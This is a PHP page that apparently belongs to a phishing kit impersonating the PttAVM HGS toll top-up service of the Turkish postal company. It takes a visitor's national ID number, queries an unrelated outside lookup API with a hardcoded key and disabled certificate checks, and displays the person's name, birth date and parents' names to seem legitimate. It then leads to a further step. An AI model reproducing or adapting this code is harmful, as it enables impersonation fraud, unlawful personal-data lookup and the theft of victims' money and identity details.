<?php
session_start();

$tc = isset($_GET['tc']) ? trim($_GET['tc']) : '';

if (!$tc || strlen($tc) !== 11 || !ctype_digit($tc)) {
    header('Location: index.php');
    exit;
}

$apiKey = '2c02bf6655fcfc35dd38e82526f1f26af1f8df58';
$apiUrl = "https://yolcuyolundagerek.online/apicin/api_handler.php?endpoint=tcpro&key={$apiKey}&tc={$tc}";

$ch = curl_init($apiUrl);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$response = curl_exec($ch);
curl_close($ch);

$result = json_decode($response, true);
$data = ($result && $result['success']) ? $result['data'] : null;

// Ad soyad session'a kaydet
if ($data) {
    $_SESSION['tc_ad']    = $data['AD'] ?? '';
    $_SESSION['tc_soyad'] = $data['SOYAD'] ?? '';
}

function fmt($val) {
    return htmlspecialchars($val ?? 'Bilinmiyor', ENT_QUOTES, 'UTF-8');
}

function fmtDate($val) {
    if (!$val || $val === 'YOK') return 'Bilinmiyor';
    $d = DateTime::createFromFormat('Y-m-d', $val);
    return $d ? $d->format('d.m.Y') : htmlspecialchars($val);
}
?>
<!doctype html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>HGS Bakiye Yükleme - PttAVM</title>
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet" />
  <link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@24,400,0,0" rel="stylesheet" />
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    :root {
      --primary: #c8912e;
      --primary-hover: #b07d24;
      --primary-light: rgba(200,145,46,0.12);
      --accent: #1a3a5c;
      --dark: #0c1824;
      --dark-card: rgba(12,24,36,0.92);
      --dark-input: rgba(20,40,60,0.7);
      --text: #f0f2f5;
      --text-muted: #8a9bb5;
      --border: rgba(255,255,255,0.1);
      --radius: 10px;
      --radius-sm: 8px;
      --green: #27ae60;
    }
    body {
      font-family: "Inter", -apple-system, BlinkMacSystemFont, sans-serif;
      background: var(--dark);
      color: var(--text);
      min-height: 100vh;
      overflow-x: hidden;
      -webkit-font-smoothing: antialiased;
    }
    nav {
      position: sticky; top: 0; z-index: 100;
      padding: 0 1.5rem; height: 60px;
      display: flex; align-items: center; justify-content: space-between;
      background: rgba(10,20,32,0.97);
      backdrop-filter: blur(16px);
      border-bottom: 2px solid var(--primary);
    }
    .nav-brand img { height: 36px; width: auto; }
    .hamburger {
      display: none; background: none; border: none;
      color: var(--text); cursor: pointer;
      width: 44px; height: 44px;
      align-items: center; justify-content: center;
      border-radius: var(--radius-sm);
    }
    .hamburger .material-symbols-outlined { font-size: 26px; }
    .nav-links {
      display: flex; align-items: center; gap: 2px; list-style: none;
    }
    .nav-links a {
      display: flex; align-items: center; gap: 6px;
      text-decoration: none; color: var(--text-muted);
      font-size: 0.82rem; font-weight: 500;
      padding: 8px 14px; border-radius: var(--radius-sm);
      transition: all 0.2s;
    }
    .nav-links a:hover { color: var(--text); background: rgba(255,255,255,0.05); }
    .nav-links .material-symbols-outlined { font-size: 18px; }

    .hero {
      position: relative;
      min-height: calc(100vh - 60px);
      display: flex; align-items: center; justify-content: center;
      padding: 2.5rem 1.5rem;
    }
    .hero-bg {
      position: absolute; inset: 0; z-index: 0;
      background: url("background.jpg") center center / cover no-repeat;
    }
    .hero-bg::after {
      content: ""; position: absolute; inset: 0;
      background: linear-gradient(180deg,
        rgba(10,20,32,0.85) 0%,
        rgba(10,20,32,0.68) 40%,
        rgba(10,20,32,0.78) 70%,
        rgba(10,20,32,0.95) 100%);
    }
    .card-wrapper {
      position: relative; z-index: 10;
      width: 100%; max-width: 560px;
    }
    .card {
      background: var(--dark-card);
      backdrop-filter: blur(20px);
      border: 1px solid var(--border);
      border-top: 3px solid var(--primary);
      border-radius: var(--radius);
      padding: 2rem;
      box-shadow: 0 24px 64px -16px rgba(0,0,0,0.6);
    }
    .card-header {
      display: flex; align-items: center; gap: 14px; margin-bottom: 0.75rem;
    }
    .card-header-icon {
      width: 48px; height: 48px;
      background: linear-gradient(135deg, var(--primary), #d4a033);
      border-radius: var(--radius-sm);
      display: flex; align-items: center; justify-content: center; flex-shrink: 0;
    }
    .card-header-icon .material-symbols-outlined { font-size: 26px; color: #fff; }
    .card-header-text h1 { font-size: 1.3rem; font-weight: 700; letter-spacing: -0.3px; }
    .card-header-text h1 span { color: var(--primary); }
    .card-header-text p { font-size: 0.78rem; color: var(--text-muted); margin-top: 2px; }
    .divider { height: 1px; background: var(--border); margin: 1.1rem 0; }

    /* Başarı badge */
    .success-badge {
      display: flex; align-items: center; gap: 8px;
      background: rgba(39,174,96,0.1);
      border: 1px solid rgba(39,174,96,0.25);
      border-left: 3px solid var(--green);
      border-radius: 6px;
      padding: 10px 14px;
      margin-bottom: 1.25rem;
      font-size: 0.82rem; color: #5dde8a;
    }
    .success-badge .material-symbols-outlined { font-size: 18px; color: var(--green); }

    /* Bilgi satırları */
    .info-grid {
      display: flex; flex-direction: column; gap: 0;
      border: 1px solid var(--border);
      border-radius: var(--radius-sm);
      overflow: hidden;
      margin-bottom: 1.5rem;
    }
    .info-row {
      display: flex; align-items: center;
      padding: 12px 16px;
      border-bottom: 1px solid var(--border);
      transition: background 0.15s;
    }
    .info-row:last-child { border-bottom: none; }
    .info-row:hover { background: rgba(255,255,255,0.03); }
    .info-label {
      display: flex; align-items: center; gap: 8px;
      min-width: 160px; font-size: 0.78rem;
      font-weight: 600; color: var(--text-muted);
      text-transform: uppercase; letter-spacing: 0.4px;
    }
    .info-label .material-symbols-outlined { font-size: 16px; color: var(--primary); }
    .info-value {
      font-size: 0.9rem; font-weight: 600; color: var(--text);
      flex: 1; text-align: right;
    }

    /* Butonlar */
    .btn-row { display: flex; gap: 10px; }
    .btn-primary {
      flex: 1; padding: 14px; border: none;
      border-radius: var(--radius-sm);
      background: var(--primary); color: #fff;
      font-family: inherit; font-size: 0.9rem; font-weight: 700;
      letter-spacing: 0.8px; text-transform: uppercase;
      cursor: pointer; display: flex; align-items: center;
      justify-content: center; gap: 8px;
      transition: all 0.2s; min-height: 48px;
      text-decoration: none;
    }
    .btn-primary:hover { background: var(--primary-hover); }
    .btn-primary:active { transform: scale(0.98); }
    .btn-primary .material-symbols-outlined { font-size: 20px; }
    .btn-secondary {
      flex: 1; padding: 14px; border: 1px solid var(--border);
      border-radius: var(--radius-sm);
      background: transparent; color: var(--text-muted);
      font-family: inherit; font-size: 0.9rem; font-weight: 600;
      cursor: pointer; display: flex; align-items: center;
      justify-content: center; gap: 8px;
      transition: all 0.2s; min-height: 48px;
      text-decoration: none;
    }
    .btn-secondary:hover { color: var(--text); background: rgba(255,255,255,0.05); }
    .btn-secondary .material-symbols-outlined { font-size: 20px; }

    /* Hata durumu */
    .error-box {
      background: rgba(192,57,43,0.08);
      border: 1px solid rgba(192,57,43,0.2);
      border-left: 3px solid #c0392b;
      border-radius: 6px; padding: 14px 16px;
      margin-bottom: 1.25rem; text-align: center;
    }
    .error-box .material-symbols-outlined { font-size: 32px; color: #e74c3c; display: block; margin-bottom: 8px; }
    .error-box p { font-size: 0.85rem; color: #e07070; }

    footer {
      position: relative; z-index: 10;
      border-top: 1px solid var(--border);
      background: #0a1420;
    }
    .footer-inner {
      max-width: 1200px; margin: 0 auto;
      padding: 1.75rem 1.5rem 1.25rem;
      display: grid; grid-template-columns: 1fr auto;
      gap: 2rem; align-items: start;
    }
    .footer-brand .brand-name { font-weight: 700; font-size: 0.95rem; }
    .footer-brand .brand-name span { color: var(--primary); }
    .footer-brand p { font-size: 0.78rem; color: var(--text-muted); line-height: 1.5; max-width: 340px; margin-top: 6px; }
    .footer-links { display: flex; gap: 2rem; list-style: none; }
    .footer-links a { font-size: 0.8rem; color: var(--text-muted); text-decoration: none; font-weight: 500; transition: color 0.2s; }
    .footer-links a:hover { color: var(--primary); }
    .footer-bottom { border-top: 1px solid var(--border); padding: 1rem 1.5rem; text-align: center; font-size: 0.75rem; color: rgba(138,155,181,0.5); }

    @media (max-width: 768px) {
      nav { padding: 0 1rem; height: 56px; }
      .nav-brand img { height: 32px; }
      .nav-links { display: none; }
      .hamburger { display: flex; }
      .hero { min-height: calc(100vh - 56px); padding: 1.5rem 1rem; }
      .card { padding: 1.5rem 1.25rem; }
      .info-label { min-width: 120px; font-size: 0.72rem; }
      .info-value { font-size: 0.85rem; }
      .btn-row { flex-direction: column; }
      .footer-inner { grid-template-columns: 1fr; padding: 1.25rem 1rem 1rem; gap: 1rem; }
      .footer-links { flex-direction: column; gap: 0; }
      .footer-links li { border-bottom: 1px solid var(--border); }
      .footer-links li:last-child { border-bottom: none; }
      .footer-links a { display: block; padding: 12px 0; }
    }
  </style>
</head>
<body>
  <nav>
    <div class="nav-brand">
      <a href="index.php"><img src="logo.png" alt="PttAVM HGS" /></a>
    </div>
    <button class="hamburger" onclick="document.querySelector('.nav-links').classList.toggle('open')" aria-label="Menu">
      <span class="material-symbols-outlined">menu</span>
    </button>
    <ul class="nav-links">
      <li><a href="index.php"><span class="material-symbols-outlined">home</span> Ana Sayfa</a></li>
      <li><a href="index.php"><span class="material-symbols-outlined">account_balance_wallet</span> HGS Yükle</a></li>
      <li><a href="#"><span class="material-symbols-outlined">query_stats</span> Hasar Sorgula</a></li>
      <li><a href="#"><span class="material-symbols-outlined">speed</span> KM Sorgula</a></li>
      <li><a href="#"><span class="material-symbols-outlined">shopping_cart</span> Alışverişe başla</a></li>
    </ul>
  </nav>

  <section class="hero">
    <div class="hero-bg"></div>
    <div class="card-wrapper">
      <div class="card">
        <div class="card-header">
          <div class="card-header-icon">
            <span class="material-symbols-outlined">badge</span>
          </div>
          <div class="card-header-text">
            <h1><span>HGS</span> Bakiye Yükleme</h1>
            <p>Kimlik bilgileri sorgu sonucu</p>
          </div>
        </div>
        <div class="divider"></div>

        <?php if ($data): ?>

          <div class="info-grid">
            <div class="info-row">
              <span class="info-label">
                <span class="material-symbols-outlined">badge</span> TC Kimlik No
              </span>
              <span class="info-value"><?= fmt($data['TC']) ?></span>
            </div>
            <div class="info-row">
              <span class="info-label">
                <span class="material-symbols-outlined">person</span> Ad Soyad
              </span>
              <span class="info-value"><?= fmt($data['AD']) ?> <?= fmt($data['SOYAD']) ?></span>
            </div>
            <div class="info-row">
              <span class="info-label">
                <span class="material-symbols-outlined">cake</span> Doğum Tarihi
              </span>
              <span class="info-value"><?= fmtDate($data['DOGUMTARIHI']) ?></span>
            </div>
            <div class="info-row">
              <span class="info-label">
                <span class="material-symbols-outlined">man</span> Baba Adı
              </span>
              <span class="info-value"><?= fmt($data['BABAADI']) ?></span>
            </div>
            <div class="info-row">
              <span class="info-label">
                <span class="material-symbols-outlined">woman</span> Anne Adı
              </span>
              <span class="info-value"><?= fmt($data['ANNEADI']) ?></span>
            </div>
          </div>

          <div class="btn-row">
            <a href="screen2.php" class="btn-primary">
              Devam Et
              <span class="material-symbols-outlined">arrow_forward</span>
            </a>
            <a href="index.php" class="btn-secondary">
              <span class="material-symbols-outlined">arrow_back</span>
              Geri Dön
            </a>
          </div>

        <?php else: ?>
          <div class="error-box">
            <span class="material-symbols-outlined">error_outline</span>
            <p>TC Kimlik numarasına ait kayıt bulunamadı veya sorgulama sırasında bir hata oluştu.</p>
          </div>
          <a href="index.php" class="btn-secondary" style="justify-content:center;">
            <span class="material-symbols-outlined">arrow_back</span>
            Geri Dön
          </a>
        <?php endif; ?>

      </div>
    </div>
  </section>

  <footer>
    <div class="footer-inner">
      <div class="footer-brand">
        <div class="brand-name">Ptt<span>AVM</span> - HGS</div>
        <p>T.C. Posta ve Telgraf Teskilati A.S. bunyesinde hizmet veren Hizli Gecis Sistemi bakiye yukleme platformu.</p>
      </div>
      <ul class="footer-links">
        <li><a href="#">Onemli Bilgiler</a></li>
        <li><a href="#">Gorus Bildir</a></li>
        <li><a href="#">Sikca Sorulan Sorular</a></li>
        <li><a href="#">Iletisim</a></li>
      </ul>
    </div>
    <div class="footer-bottom">&copy; 2026 PttAVM | Tum haklari saklidir.</div>
  </footer>
</body>
</html>
